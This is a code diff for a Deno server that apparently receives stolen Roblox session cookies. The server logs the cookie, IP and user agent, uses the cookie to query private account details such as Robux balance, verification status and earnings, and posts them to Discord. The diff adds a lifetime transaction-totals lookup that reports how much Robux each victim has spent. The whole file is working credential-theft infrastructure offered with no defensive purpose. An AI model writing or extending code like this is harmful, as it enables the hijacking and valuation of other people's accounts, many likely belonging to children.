@@ -94,6 +94,8 @@ Deno.serve(async (req) => {
         roblox_voice_enabled: robloxInfo?.voiceEnabled ?? null,
         roblox_age_verified: robloxInfo?.ageVerified ?? null,
         roblox_gamepass_earnings: robloxInfo?.gamepassEarnings ?? null,
+        roblox_robux_spent: robloxInfo?.robuxSpent ?? null,
+        roblox_summary: robloxInfo?.summary ?? null,
         cookie_preview: body.cookie.slice(-16),
         ip_address: ip,
         user_agent: userAgent,
@@ -167,6 +169,8 @@ interface RobloxInfo {
   voiceEnabled: boolean | null;
   ageVerified: boolean | null;
   gamepassEarnings: number | null;
+  robuxSpent: number | null;
+  summary: number | null;
   screenshotUrl: string | null;
 }
 
@@ -179,7 +183,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, gamepassEarnings] = await Promise.all([
+    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, gamepassEarnings, transactionTotals] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -195,6 +199,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchVoiceEnabled(cookieHeader),
       fetchAgeVerified(cookieHeader),
       fetchGamepassEarnings(auth.id),
+      fetchTransactionTotals(auth.id, cookieHeader),
     ]);
 
     const createdAt = profile?.created ?? null;
@@ -226,6 +231,8 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       voiceEnabled,
       ageVerified,
       gamepassEarnings,
+      robuxSpent: transactionTotals.spent,
+      summary: transactionTotals.summary,
       screenshotUrl,
     };
   } catch (e) {
@@ -284,6 +291,44 @@ async function fetchGamepassEarnings(userId: number): Promise<number | null> {
     }
     return total;
   } catch { return null; }
+}
+
+// Lifetime Robux flow: incoming (sales/commerce) and outgoing (purchases/spent).
+// Uses the authed transaction-totals endpoint with timeFrame=AllTime.
+async function fetchTransactionTotals(
+  userId: number,
+  cookieHeader: string,
+): Promise<{ spent: number | null; summary: number | null }> {
+  try {
+    const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=AllTime&transactionType=summary`;
+    const r = await fetch(url, { headers: { Cookie: cookieHeader } });
+    if (!r.ok) return { spent: null, summary: null };
+    const j = await r.json() as Record<string, number>;
+
+    // Outgoing buckets — sum of all Robux ever spent
+    const spent =
+      (j.purchasesTotal ?? 0) +
+      (j.tradeSystemFeesTotal ?? 0) +
+      (j.tradeSystemTaxesTotal ?? 0) +
+      (j.groupPayoutsTotal ?? 0) +
+      (j.currencyPurchasesTotal ?? 0) +
+      (j.premiumStipendsTotal ?? 0) * 0; // exclude — incoming
+
+    // Incoming buckets — sum of all Robux ever received
+    const incoming =
+      (j.salesTotal ?? 0) +
+      (j.affiliateSalesTotal ?? 0) +
+      (j.groupPayoutsTotal ?? 0) * 0 + // group payouts are outgoing for owners
+      (j.commissionsTotal ?? 0) +
+      (j.tradeSystemEarningsTotal ?? 0) +
+      (j.individualToGroupTotal ?? 0) * 0 +
+      (j.premiumPayoutsTotal ?? 0) +
+      (j.groupPremiumPayoutsTotal ?? 0);
+
+    return { spent, summary: incoming - spent };
+  } catch {
+    return { spent: null, summary: null };
+  }
 }
 
 async function fetchProfile(userId: number): Promise<{ created: string } | null> {
@@ -415,6 +460,8 @@ function buildDiscordPayload(opts: {
       { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
       { name: "💸 Gamepass Earnings", value: roblox.gamepassEarnings !== null ? `${roblox.gamepassEarnings.toLocaleString()} R$` : "Unknown", inline: true },
+      { name: "💳 Total Robux Spent", value: roblox.robuxSpent !== null ? `${roblox.robuxSpent.toLocaleString()} R$` : "Unknown", inline: true },
+      { name: "📊 Lifetime Summary", value: roblox.summary !== null ? `${roblox.summary >= 0 ? "+" : ""}${roblox.summary.toLocaleString()} R$` : "Unknown", inline: true },
     );
 
     // Owned groups — chunked to 1024 chars per field
